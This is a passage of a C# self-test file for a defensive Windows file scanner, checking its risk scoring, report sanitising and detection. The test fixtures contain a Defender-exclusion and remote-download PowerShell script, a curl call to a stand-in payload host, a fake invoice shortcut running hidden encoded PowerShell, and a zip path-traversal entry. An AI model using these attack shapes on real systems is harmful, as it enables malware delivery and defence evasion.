using System.Buffers.Binary;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text.Json;

namespace DestinyBlackBox;

internal sealed record ProductSelfTestResult(bool Passed, int Checks)
{
    public string SafeStatusLine => $"PC_BLACK_BOX_SELF_TEST passed={Passed.ToString().ToLowerInvariant()} checks={Checks}";
}

internal static class ProductSelfTest
{
    public static ProductSelfTestResult Run()
    {
        int checks = 0;
        try
        {
            var high = CreateFile("danger.ps1", "Script / active text", "NotSigned", "—", "example.invalid",
                new("danger", "process-injection", "プロセス注入", "Process injection", 60));
            var review = CreateFile("review.exe", "Windows PE", "Valid", "Microsoft Windows", "—",
                new("watch", "internet-zone", "インターネット由来", "Internet origin", 25));
            var low = CreateFile("note.txt", "Text", "Not checked", "—", "—",
                new("info", "low-signal", "弱い兆候", "Low signal", 4));
            var clear = CreateFile("readme.txt", "Text", "Not checked", "—", "—");
            FileAnalysis[] files = [high, review, low, clear];

            Require(FileViewQuery.Apply(files, "ALL", null).Count == 4, ref checks);
            Require(FileViewQuery.Apply(files, "HIGH", null).SequenceEqual([high]), ref checks);
            Require(FileViewQuery.Apply(files, "REVIEW", null).SequenceEqual([review]), ref checks);
            Require(FileViewQuery.Apply(files, "LOW", null).SequenceEqual([low]), ref checks);
            Require(FileViewQuery.Apply(files, "CLEAR", null).SequenceEqual([clear]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "danger").SequenceEqual([high]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "Microsoft").SequenceEqual([review]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "injection").SequenceEqual([high]), ref checks);
            Require(FileViewQuery.Apply(files, "ALL", "example.invalid").SequenceEqual([high]), ref checks);
            Require(!SecurityPolicy.SanitizeText("safe\u202Etxt").Contains('\u202E'), ref checks);
            Require(!SecurityPolicy.WouldExceedCumulativeLimit(SecurityPolicy.MaxTargetBytes - 1, 1, SecurityPolicy.MaxTargetBytes), ref checks);
            Require(SecurityPolicy.WouldExceedCumulativeLimit(SecurityPolicy.MaxTargetBytes - 1, 2, SecurityPolicy.MaxTargetBytes), ref checks);
            Require(!FileInspector.WouldExceedDirectoryLimits(9999, 128), ref checks);
            Require(FileInspector.WouldExceedDirectoryLimits(10000, 128), ref checks);
            Require(FileInspector.WouldExceedDirectoryLimits(1, 129), ref checks);
            Require(!FileInspector.WouldExceedEnumerationLimit(19999), ref checks);
            Require(FileInspector.WouldExceedEnumerationLimit(20000), ref checks);
            Require(!FileInspector.WouldExceedRetainedPathLimit(8L * 1024 * 1024 - 1, 1), ref checks);
            Require(FileInspector.WouldExceedRetainedPathLimit(8L * 1024 * 1024 - 1, 2), ref checks);
            Require(TestValidEmptyArchivePreflight(), ref checks);
            Require(TestValidSingleEntryArchivePreflight(), ref checks);
            Require(TestValidEmptyZip64Preflight(), ref checks);
            Require(TestArchiveEntryFloodPreflight(), ref checks);
            Require(TestUnderreportedArchivePreflight(), ref checks);
            Require(TestAmbiguousEndRecordPreflight(), ref checks);
            SecurityPosture posture = WindowsProcessHardening.Current;
            Require(posture.IsEnforced, ref checks);
            Require(posture.Controls.Select(control => control.Code).Distinct(StringComparer.Ordinal).Count() == posture.Controls.Count, ref checks);
            Require(posture.Controls.All(control =>
                control.Tier != SecurityControlTier.Required || control.State == SecurityControlState.Enforced), ref checks);
            Require(posture.RequiredCount + posture.ReinforcementCount == posture.Controls.Count, ref checks);
            Require(posture.ReinforcementEnforcedCount <= posture.ReinforcementCount, ref checks);
            Require(!ProcessElevation.IsElevated, ref checks);
            Require(ProcessObjectLockdown.VerifyCurrentPolicy(), ref checks);
            Require(ProcessObjectLockdown.VerifyDistinctTokenOwnerModel(), ref checks);
            Require(TestBaselineFailureMessage(), ref checks);
            Require(TestElevationRefusalMessage(), ref checks);
            Require(WindowsProcessHardening.VerifyReportedSideChannelPolicy(), ref checks);
            Require(NetworkIsolationGuard.IsArmedAndManagedTransportFree(), ref checks);
            Require(
                new SecurityControlStatus("probe", SecurityControlTier.PlatformReinforcement, SecurityControlState.NotEnforced)
                    .SafeLine.EndsWith("state=not-enforced", StringComparison.Ordinal) &&
                new SecurityControlStatus("probe", SecurityControlTier.PlatformReinforcement, SecurityControlState.Unavailable)
                    .SafeLine.EndsWith("state=unavailable", StringComparison.Ordinal),
                ref checks);
            Require(TestNetworkIsolationNames(), ref checks);

            var result = new ScanResult
            {
                TargetName = "self-test.txt",
                SecurityProfile = SecurityPosture.ProfileId,
                SecurityControlsEnforced = posture.EnforcedCount,
                SecurityControlsRequired = posture.RequiredCount,
                SecurityReinforcementsEnforced = posture.ReinforcementEnforcedCount,
                SecurityReinforcementsAvailable = posture.ReinforcementCount,
                StartedAt = DateTime.Now
            };
            result.Files.Add(clear);
            string report = ReportBuilder.Build(result, "en");
            Require(report.Contains($"{posture.EnforcedCount}/{posture.RequiredCount} controls enforced", StringComparison.Ordinal), ref checks);
            Require(report.Contains($"{posture.ReinforcementEnforcedCount}/{posture.ReinforcementCount} active on this system", StringComparison.Ordinal), ref checks);
            Require(!report.Contains("C:\\Users\\", StringComparison.OrdinalIgnoreCase), ref checks);
            Require(TestGuardedReportReplacement(result), ref checks);

            Require(FileInspector.IsActiveContentExtension(".EXE"), ref checks);
            Require(FileInspector.IsActiveContentExtension(".ps1"), ref checks);
            Require(FileInspector.IsActiveContentExtension(".LnK"), ref checks);
            Require(TestRiskBands(), ref checks);
            Require(TestReportOmitsAbsolutePathAndSanitizesCells(), ref checks);
            Require(TestTextInspectionHashesWithoutExecuting(), ref checks);
            Require(TestScriptCapabilitiesRaiseReview(), ref checks);
            Require(TestLateScriptCapabilitiesRaiseReview(), ref checks);
            Require(TestChunkBoundaryCapability(), ref checks);
            Require(TestBoundedWhitespaceCapabilityAcrossChunk(), ref checks);
            Require(TestLateOddAlignedUnicodeCapability(), ref checks);
            Require(TestLongPathExtensionUsesFullPath(), ref checks);
            Require(TestInvalidArchiveMakesResultIncomplete(), ref checks);
            Require(TestRiskAndCompletenessRemainSeparate(), ref checks);
            Require(TestCapabilityBudgetsStayOrdered(), ref checks);
            Require(TestHashLookupUrlFailsClosed(), ref checks);
            Require(TestShortcutCommandLineIsRead(), ref checks);
            Require(TestHostileShortcutFailsClosed(), ref checks);
            Require(TestOleCompoundIsScannedAndNeverComplete(), ref checks);
            Require(TestArchiveFindingsWithoutExtraction(), ref checks);
            Require(TestCanceledInspectionReadsNothing(), ref checks);
            return new ProductSelfTestResult(true, checks);
        }
        catch
        {
            return new ProductSelfTestResult(false, checks);
        }
    }

    /// <summary>
    /// Locks the transport list in both directions: the socket-level assemblies stay blocked, and the
    /// request-level assemblies that System.Configuration loads for local file access stay allowed.
    /// </summary>
    private static bool TestNetworkIsolationNames() =>
        NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Sockets") &&
        NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Http") &&
        NetworkIsolationGuard.IsBlockedAssemblyName("system.net.quic") &&
        NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.NameResolution") &&
        !NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Primitives") &&
        !NetworkIsolationGuard.IsBlockedAssemblyName("System.Net.Requests") &&
        !NetworkIsolationGuard.IsBlockedAssemblyName(null) &&
        !NetworkIsolationGuard.IsBlockedAssemblyName("PresentationCore");

    /// <summary>
    /// The failure dialog must name the required controls that failed, in either language, and must not
    /// pad the list with reinforcements the operator is not being stopped for.
    /// </summary>
    private static bool TestBaselineFailureMessage()
    {
        var posture = new SecurityPosture(
        [
            new SecurityControlStatus("process-object-lockdown", SecurityControlTier.Required, SecurityControlState.NotEnforced),
            new SecurityControlStatus("dep", SecurityControlTier.Required, SecurityControlState.Enforced),
            new SecurityControlStatus("user-shadow-stack", SecurityControlTier.PlatformReinforcement, SecurityControlState.Unavailable)
        ]);
        string english = App.BuildSecurityFailureMessage(posture, japanese: false);
        string japanese = App.BuildSecurityFailureMessage(posture, japanese: true);
        const string expected = "control=process-object-lockdown tier=required state=not-enforced";

        return english.Contains("without inspecting any files", StringComparison.Ordinal) &&
               english.Contains(expected, StringComparison.Ordinal) &&
               !english.Contains("control=user-shadow-stack", StringComparison.Ordinal) &&
               !english.Contains("control=dep", StringComparison.Ordinal) &&
               japanese.Contains("ファイルを調べずに終了", StringComparison.Ordinal) &&
               japanese.Contains(expected, StringComparison.Ordinal) &&
               !japanese.Contains("control=user-shadow-stack", StringComparison.Ordinal);
    }

    /// <summary>An elevated launch must be told what to do instead, in either language.</summary>
    private static bool TestElevationRefusalMessage() =>
        App.BuildElevationRefusalMessage(japanese: false).Contains("administrator rights", StringComparison.Ordinal) &&
        App.BuildElevationRefusalMessage(japanese: true).Contains("通常の権限で起動", StringComparison.Ordinal) &&
        ProcessElevation.SafeRefusalLine.Equals("PC_BLACK_BOX_ELEVATION elevated=true refusing=true", StringComparison.Ordinal);

    /// <summary>Locks the documented score bands and the clamp that keeps a score inside 0–100.</summary>
    private static bool TestRiskBands()
    {
        var high = new FileAnalysis();
        high.Indicators.Add(new Indicator("danger", "one", "ja", "en", 80));
        high.Indicators.Add(new Indicator("danger", "two", "ja", "en", 80));

        var review = new FileAnalysis();
        review.Indicators.Add(new Indicator("watch", "review", "ja", "en", 25));

        var low = new FileAnalysis();
        low.Indicators.Add(new Indicator("info", "low", "ja", "en", 0));

        return high.RiskScore == 100 &&
               high.RiskCode.Equals("HIGH", StringComparison.Ordinal) &&
               review.RiskCode.Equals("REVIEW", StringComparison.Ordinal) &&
               low.RiskCode.Equals("LOW", StringComparison.Ordinal);
    }

    /// <summary>
    /// Keeps the absolute target path out of both report formats and keeps table-breaking and
    /// control characters out of the Markdown cells while the JSON keeps the sanitized name.
    /// </summary>
    private static bool TestReportOmitsAbsolutePathAndSanitizesCells()
    {
        var result = new ScanResult
        {
            TargetPath = @"C:\Users\Private\secret.ps1",
            TargetName = "secret.ps1",
            StartedAt = new DateTime(2026, 8, 6, 9, 0, 0, DateTimeKind.Local),
            Duration = TimeSpan.FromSeconds(1)
        };
        result.Files.Add(new FileAnalysis
        {
            FullPath = result.TargetPath,
            RelativePath = "folder|name`\r\n.ps1",
            Size = 12,
            Sha256 = new string('A', 64),
            FileType = "Script / active text"
        });

        string markdown = ReportBuilder.Build(result, "en");
        string json = ReportBuilder.BuildJson(result, "en");
        using JsonDocument document = JsonDocument.Parse(json);

        return markdown.IndexOf(result.TargetPath, StringComparison.OrdinalIgnoreCase) < 0 &&
               json.IndexOf(result.TargetPath, StringComparison.OrdinalIgnoreCase) < 0 &&
               markdown.Contains("folder/name'\uFFFD\uFFFD.ps1", StringComparison.Ordinal) &&
               document.RootElement.GetProperty("schema").GetString() is "pc-black-box-report-v3" &&
               document.RootElement.GetProperty("files")[0].GetProperty("path").GetString()
                   is "folder|name`\uFFFD\uFFFD.ps1";
    }

    /// <summary>
    /// Inspects an ordinary text file and confirms the reported digest is the digest of the bytes on
    /// disk, so the evidence comes from reading the target rather than from running it.
    /// </summary>
    private static bool TestTextInspectionHashesWithoutExecuting() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "notes.txt");
            File.WriteAllText(path, "ordinary text");

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.RelativePath.Equals("notes.txt", StringComparison.Ordinal) &&
                   file.FileType.Equals("Text", StringComparison.Ordinal) &&
                   file.Sha256.Equals(
                       Convert.ToHexString(SHA256.HashData(File.ReadAllBytes(path))),
                       StringComparison.Ordinal) &&
                   result.RiskCode.Equals("CLEAR", StringComparison.Ordinal);
        });

    /// <summary>Locks the capability findings and the resulting band for a script that reads as active content.</summary>
    private static bool TestScriptCapabilitiesRaiseReview() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "admin.ps1");
            File.WriteAllText(
                path,
                "Add-MpPreference -ExclusionPath C:\\Temp\nInvoke-WebRequest https://example.invalid/tool.exe");

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("defender-change", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("remote-download", StringComparison.Ordinal)) &&
                   file.RiskCode.Equals("REVIEW", StringComparison.Ordinal);
        });

    /// <summary>Proves capability matching covers bytes beyond the former first-8-MiB sample boundary.</summary>
    private static bool TestLateScriptCapabilitiesRaiseReview() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "late-capability.ps1");
            const long markerOffset = 8L * 1024 * 1024 + 4096;
            byte[] marker = System.Text.Encoding.ASCII.GetBytes("WriteProcessMemory\n");
            using (var stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None))
            {
                stream.SetLength(markerOffset);
                stream.Position = markerOffset;
                stream.Write(marker, 0, marker.Length);
                stream.Flush(flushToDisk: true);
            }

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("process-injection", StringComparison.Ordinal)) &&
                   file.CapabilityScanApplicable &&
                   file.CapabilityScannedBytes == file.Size &&
                   !result.IsPartial;
        });

    /// <summary>Locks the overlap that preserves an indicator split across two streaming reads.</summary>
    private static bool TestChunkBoundaryCapability() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "boundary-capability.ps1");
            const long markerOffset = 1024L * 1024 - 7;
            byte[] marker = System.Text.Encoding.ASCII.GetBytes("WriteProcessMemory\n");
            using (var stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None))
            {
                stream.SetLength(markerOffset);
                stream.Position = markerOffset;
                stream.Write(marker, 0, marker.Length);
            }

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("process-injection", StringComparison.Ordinal));
        });

    /// <summary>Locks a bounded-whitespace capability match that crosses a streaming boundary.</summary>
    private static bool TestBoundedWhitespaceCapabilityAcrossChunk() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "boundary-whitespace.ps1");
            string markerText = "curl" + new string(' ', 256) + "https://example.invalid/payload";
            byte[] marker = System.Text.Encoding.ASCII.GetBytes(markerText);
            long markerOffset = 1024L * 1024 - marker.Length / 2;
            using (var stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None))
            {
                stream.SetLength(markerOffset);
                stream.Position = markerOffset;
                stream.Write(marker, 0, marker.Length);
            }

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("remote-download", StringComparison.Ordinal));
        });

    /// <summary>Finds UTF-16 capability text even when its first byte is at an odd file offset.</summary>
    private static bool TestLateOddAlignedUnicodeCapability() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "late-unicode-capability.ps1");
            const long markerOffset = 8L * 1024 * 1024 + 4097;
            byte[] marker = System.Text.Encoding.Unicode.GetBytes("WriteProcessMemory\n");
            using (var stream = new FileStream(path, FileMode.CreateNew, FileAccess.Write, FileShare.None))
            {
                stream.SetLength(markerOffset);
                stream.Position = markerOffset;
                stream.Write(marker, 0, marker.Length);
            }

            ScanResult result = Inspect(path);
            return result.Files.Count == 1 &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("process-injection", StringComparison.Ordinal)) &&
                   result.Files[0].CapabilityScannedBytes == result.Files[0].Size;
        });

    /// <summary>Uses the untruncated full path when the display path no longer carries its extension.</summary>
    private static bool TestLongPathExtensionUsesFullPath()
    {
        var file = new FileAnalysis
        {
            FullPath = @"C:\fixtures\tool.ps1",
            RelativePath = new string('x', 1024)
        };
        return FileInspector.GetInspectionExtension(file).Equals(".ps1", StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>Exercises the production invalid-archive path and prevents it from being presented as complete.</summary>
    private static bool TestInvalidArchiveMakesResultIncomplete() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "invalid.zip");
            File.WriteAllBytes(path, [0x50, 0x4B, 0x03, 0x04, 0x00, 0x00, 0x00, 0x00]);

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            string report = ReportBuilder.Build(result, "en");
            string json = ReportBuilder.BuildJson(result, "en");
            using JsonDocument document = JsonDocument.Parse(json);
            JsonElement jsonResult = document.RootElement.GetProperty("result");
            return result.Files[0].InspectionLimited &&
                   result.Files[0].Indicators.Any(indicator => indicator.Code.Equals("invalid-archive", StringComparison.Ordinal)) &&
                   result.IsPartial &&
                   result.CompletenessCode.Equals("INCOMPLETE", StringComparison.Ordinal) &&
                   result.AssessmentCode.Contains("INCOMPLETE", StringComparison.Ordinal) &&
                   jsonResult.GetProperty("risk").GetString() is "LOW" &&
                   jsonResult.GetProperty("completeness").GetString() is "INCOMPLETE" &&
                   report.Contains("INCOMPLETE", StringComparison.Ordinal) &&
                   !report.Contains("No obvious risk indicator was found", StringComparison.Ordinal);
        });

    /// <summary>Keeps a known HIGH visible even when a separate completeness failure is present.</summary>
    private static bool TestRiskAndCompletenessRemainSeparate()
    {
        var result = new ScanResult
        {
            TargetName = "high-and-incomplete",
            IsPartial = true,
            PartialReason = "test scope is incomplete"
        };
        var file = new FileAnalysis { RelativePath = "known-risk.ps1" };
        file.Indicators.Add(new Indicator("danger", "known-risk", "既知の強い指標", "Known strong indicator", 60));
        result.Files.Add(file);

        using JsonDocument document = JsonDocument.Parse(ReportBuilder.BuildJson(result, "en"));
        JsonElement jsonResult = document.RootElement.GetProperty("result");
        return result.RiskCode.Equals("HIGH", StringComparison.Ordinal) &&
               result.CompletenessCode.Equals("INCOMPLETE", StringComparison.Ordinal) &&
               result.AssessmentCode.Equals("HIGH+INCOMPLETE", StringComparison.Ordinal) &&
               jsonResult.GetProperty("risk").GetString() is "HIGH" &&
               jsonResult.GetProperty("completeness").GetString() is "INCOMPLETE" &&
               jsonResult.GetProperty("assessment").GetString() is "HIGH+INCOMPLETE";
    }

    /// <summary>
    /// Keeps the per-inspection budget at or above the per-file budget. Inverted budgets would cut every
    /// file short at the smaller number while the report still named the per-file limit as the reason.
    /// </summary>
    private static bool TestCapabilityBudgetsStayOrdered() =>
        FileInspector.MaxCapabilityBytesPerScan >= FileInspector.MaxCapabilityBytesPerFile &&
        FileInspector.MaxCapabilityTimePerScan >= FileInspector.MaxCapabilityTimePerFile;

    /// <summary>
    /// Builds a lookup URL only from a well-formed digest. The URL is the one place a target-derived
    /// value is offered for the operator to carry off this machine, so anything else must fail closed.
    /// </summary>
    private static bool TestHashLookupUrlFailsClosed()
    {
        if (!SecurityPolicy.TryBuildHashLookupUrl(new string('A', 64), out string url)) return false;
        if (!url.Equals("https://www.virustotal.com/gui/file/" + new string('a', 64), StringComparison.Ordinal)) return false;

        string[] rejected =
        [
            String.Empty,
            new string('a', 63),
            new string('a', 65),
            new string('g', 64),
            "../" + new string('a', 61)
        ];
        foreach (string candidate in rejected)
        {
            if (SecurityPolicy.TryBuildHashLookupUrl(candidate, out string leaked) || leaked.Length != 0) return false;
        }

        return SecurityPolicy.TryBuildHashLookupUrl(null, out string missing) == false && missing.Length == 0;
    }

    /// <summary>
    /// Builds the delivery shape this product used to miss entirely: a shortcut wearing a document name
    /// whose command line runs an encoded PowerShell payload in a hidden window. Nothing here is executed.
    /// </summary>
    private static byte[] BuildShortcut(string relativePath, string arguments, uint showCommand)
    {
        const uint hasRelativePath = 0x00000008;
        const uint hasArguments = 0x00000020;
        const uint isUnicode = 0x00000080;

        using var buffer = new MemoryStream();
        using var writer = new BinaryWriter(buffer, System.Text.Encoding.Unicode, leaveOpen: true);
        writer.Write(0x4C);
        writer.Write(new byte[]
        {
            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
        });
        writer.Write(hasRelativePath | hasArguments | isUnicode);
        writer.Write(0x00000020);
        writer.Write(0L);
        writer.Write(0L);
        writer.Write(0L);
        writer.Write(0);
        writer.Write(0);
        writer.Write(showCommand);
        writer.Write((ushort)0);
        writer.Write((ushort)0);
        writer.Write(0);
        writer.Write(0);

        foreach (string value in new[] { relativePath, arguments })
        {
            writer.Write((ushort)value.Length);
            writer.Write(System.Text.Encoding.Unicode.GetBytes(value));
        }

        writer.Write(0);
        writer.Flush();
        return buffer.ToArray();
    }

    /// <summary>A shortcut is judged by the command line it carries, not by its extension.</summary>
    private static bool TestShortcutCommandLineIsRead() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "invoice.pdf.lnk");
            string encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("Write-Host 'self test'"));
            File.WriteAllBytes(path, BuildShortcut(
                @"..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                $"-w hidden -nop -enc {encoded}",
                showCommand: 7));

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            bool Has(string code) => file.Indicators.Any(indicator => indicator.Code.Equals(code, StringComparison.Ordinal));
            return file.FileType.Equals(FileInspector.ShortcutType, StringComparison.Ordinal) &&
                   file.ShortcutTarget.Contains("powershell.exe", StringComparison.OrdinalIgnoreCase) &&
                   file.ShortcutArguments.Contains("-enc", StringComparison.Ordinal) &&
                   Has("shortcut-runs-interpreter") &&
                   Has("encoded-command") &&
                   Has("hidden-window") &&
                   Has("shortcut-hidden-start") &&
                   Has("double-extension") &&
                   file.RiskCode.Equals("HIGH", StringComparison.Ordinal);
        });

    /// <summary>
    /// A shortcut whose declared sizes do not fit must end the walk and say so, never throw and never
    /// present itself as fully read.
    /// </summary>
    private static bool TestHostileShortcutFailsClosed() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "hostile.lnk");
            byte[] shortcut = BuildShortcut(@"C:\Windows\System32\cmd.exe", "/c echo", showCommand: 1);
            // Claim every optional structure is present and hand it nothing but the header.
            BinaryPrimitives.WriteUInt32LittleEndian(shortcut.AsSpan(0x14), 0xFFFFFFFF);
            File.WriteAllBytes(path, shortcut.AsSpan(0, 0x4C + 2).ToArray());

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.FileType.Equals(FileInspector.ShortcutType, StringComparison.Ordinal) &&
                   file.InspectionLimited &&
                   result.IsPartial &&
                   result.AssessmentCode.Contains("INCOMPLETE", StringComparison.Ordinal);
        });

    /// <summary>
    /// An installer or Office document is read for its strings, and is never called complete, because its
    /// storage tree and tables are not parsed.
    /// </summary>
    private static bool TestOleCompoundIsScannedAndNeverComplete() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "setup.msi");
            string encoded = Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("Write-Host 'self test'"));
            byte[] header = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
            byte[] body = System.Text.Encoding.Unicode.GetBytes($" powershell.exe -enc {encoded} ");
            File.WriteAllBytes(path, [.. header, .. new byte[512], .. body]);

            ScanResult result = Inspect(path);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.FileType.Equals(FileInspector.OleCompoundType, StringComparison.Ordinal) &&
                   file.CapabilityScanApplicable &&
                   file.CapabilityScannedBytes == file.Size &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("encoded-command", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("ole-structure-unparsed", StringComparison.Ordinal)) &&
                   file.InspectionLimited &&
                   result.CompletenessCode.Equals("INCOMPLETE", StringComparison.Ordinal) &&
                   !result.AssessmentCode.Equals("CLEAR", StringComparison.Ordinal);
        });

    /// <summary>
    /// Reports an escaping path and active content inside an archive from the central directory alone:
    /// nothing is extracted, so the escaping entry must not appear next to the archive.
    /// </summary>
    private static bool TestArchiveFindingsWithoutExtraction() =>
        WithFixtureDirectory(directory =>
        {
            string archivePath = Path.Combine(directory, "sample.zip");
            using (var archive = ZipFile.Open(archivePath, ZipArchiveMode.Create))
            {
                using var writer = new StreamWriter(archive.CreateEntry("../escape.ps1").Open());
                writer.Write("Write-Output safe-test");
            }

            ScanResult result = Inspect(archivePath);
            if (result.Files.Count != 1) return false;

            FileAnalysis file = result.Files[0];
            return file.Indicators.Any(indicator => indicator.Code.Equals("archive-traversal", StringComparison.Ordinal)) &&
                   file.Indicators.Any(indicator => indicator.Code.Equals("archive-active-content", StringComparison.Ordinal)) &&
                   !File.Exists(Path.Combine(directory, "escape.ps1")) &&
                   !File.Exists(Path.Combine(Path.GetDirectoryName(directory)!, "escape.ps1"));
        });

    /// <summary>Confirms an already-canceled inspection ends without opening the target.</summary>
    private static bool TestCanceledInspectionReadsNothing() =>
        WithFixtureDirectory(directory =>
        {
            string path = Path.Combine(directory, "cancel.txt");
            File.WriteAllText(path, "not read");
            using var cancellation = new CancellationTokenSource();
            cancellation.Cancel();

            try
            {
                Inspect(path, cancellation.Token);
                return false;
            }
            catch (OperationCanceledException)
            {
                return true;
            }
        });

    private static ScanResult Inspect(string targetPath, CancellationToken cancellationToken = default) =>
        new FileInspector().ScanAsync(targetPath, null, cancellationToken).GetAwaiter().GetResult();

    /// <summary>
    /// Runs one check inside a private temporary directory and removes that directory afterwards. The
    /// directory is created by this process, so no caller-supplied target is inspected.
    /// </summary>
    private static bool WithFixtureDirectory(Func<string, bool> check)
    {
        string temporaryRoot = SecurityPolicy.ValidateLocalDirectory(Path.GetTempPath(), mustExist: true);
        string directory = Path.Combine(temporaryRoot, $"PCBlackBox-SelfTest-{Guid.NewGuid():N}");
        Directory.CreateDirectory(directory);
        try
        {
            return check(directory);
        }
        finally
        {
            try
            {
                if (Directory.Exists(directory) && (File.GetAttributes(directory) & FileAttributes.ReparsePoint) == 0)
                {
                    Directory.Delete(directory, recursive: true);
                }
            }
            catch { }
        }
    }

    private static FileAnalysis CreateFile(
        string relativePath,
        string fileType,
        string signatureStatus,
        string signer,
        string sourceHost,
        Indicator? indicator = null)
    {
        var file = new FileAnalysis
        {
            RelativePath = relativePath,
            FileType = fileType,
            SignatureStatus = signatureStatus,
            Signer = signer,
            SourceHost = sourceHost
        };
        if (indicator is not null) file.Indicators.Add(indicator);
        return file;
    }

    private static bool TestGuardedReportReplacement(ScanResult result)
    {
        string temporaryRoot = SecurityPolicy.ValidateLocalDirectory(Path.GetTempPath(), mustExist: true);
        string directory = Path.Combine(temporaryRoot, $"PCBlackBox-SelfTest-{Guid.NewGuid():N}");
        string reportPath = Path.Combine(directory, "report.md");
        bool replacementVerified = false;
        try
        {
            Directory.CreateDirectory(directory);
            SafeReportWriter.Write(reportPath, "first", result, ".md", allowOverwrite: false);
            SafeReportWriter.Write(reportPath, "second", result, ".md", allowOverwrite: true);
            using FileStream stream = SecureFileReader.OpenRead(reportPath, 4096);
            using var reader = new StreamReader(stream);
            replacementVerified = reader.ReadToEnd().Equals("second", StringComparison.Ordinal);
        }
        finally
        {
            try
            {
                if (File.Exists(reportPath) && (File.GetAttributes(reportPath) & FileAttributes.ReparsePoint) == 0)
                {
                    File.Delete(reportPath);
                }
                if (Directory.Exists(directory) && (File.GetAttributes(directory) & FileAttributes.ReparsePoint) == 0)
                {
                    Directory.Delete(directory, recursive: false);
                }
            }
            catch { }
        }
        return replacementVerified &&
               !File.Exists(reportPath) && !Directory.Exists(reportPath) &&
               !File.Exists(directory) && !Directory.Exists(directory);
    }

    private static bool TestValidEmptyArchivePreflight()
    {
        using var stream = new MemoryStream();
        using (new ZipArchive(stream, ZipArchiveMode.Create, leaveOpen: true))
        {
        }
        stream.Position = 0;
        return FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static bool TestArchiveEntryFloodPreflight()
    {
        byte[] endRecord = new byte[22];
        BinaryPrimitives.WriteUInt32LittleEndian(endRecord, 0x06054B50);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord.AsSpan(8), 10001);
        BinaryPrimitives.WriteUInt16LittleEndian(endRecord.AsSpan(10), 10001);
        using var stream = new MemoryStream(endRecord, writable: false);
        return !FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static bool TestValidSingleEntryArchivePreflight()
    {
        using MemoryStream stream = CreateSingleEntryArchive();
        return FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static bool TestUnderreportedArchivePreflight()
    {
        using MemoryStream validArchive = CreateSingleEntryArchive();
        byte[] bytes = validArchive.ToArray();
        int endRecordOffset = bytes.Length - 22;
        BinaryPrimitives.WriteUInt16LittleEndian(bytes.AsSpan(endRecordOffset + 8), 0);
        BinaryPrimitives.WriteUInt16LittleEndian(bytes.AsSpan(endRecordOffset + 10), 0);
        using var malformedArchive = new MemoryStream(bytes, writable: false);
        return !FileInspector.IsArchiveStructureWithinLimits(malformedArchive);
    }

    private static bool TestAmbiguousEndRecordPreflight()
    {
        using MemoryStream validArchive = CreateSingleEntryArchive();
        byte[] original = validArchive.ToArray();
        byte[] ambiguous = new byte[original.Length + 22];
        original.CopyTo(ambiguous, 0);
        BinaryPrimitives.WriteUInt32LittleEndian(ambiguous.AsSpan(original.Length), 0x06054B50);
        using var stream = new MemoryStream(ambiguous, writable: false);
        return !FileInspector.IsArchiveStructureWithinLimits(stream);
    }

    private static MemoryStream CreateSingleEntryArchive()
    {
        var stream = new MemoryStream();
        using (var archive = new ZipArchive(stream, ZipArchiveMode.Create, leaveOpen: true))
        {
            ZipArchiveEntry entry = archive.CreateEntry("one.txt", CompressionLevel.NoCompression);
            using Stream entryStream = entry.Open();
            entryStream.WriteByte(1);
        }
